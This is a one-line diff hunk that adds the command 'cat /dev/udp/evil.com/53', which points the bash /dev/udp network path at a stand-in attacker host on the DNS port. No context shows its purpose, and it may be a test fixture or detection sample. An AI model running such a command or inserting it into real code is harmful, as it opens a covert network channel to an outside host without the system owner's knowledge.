@@ -1,0 +1,1 @@
+cat /dev/udp/evil.com/53
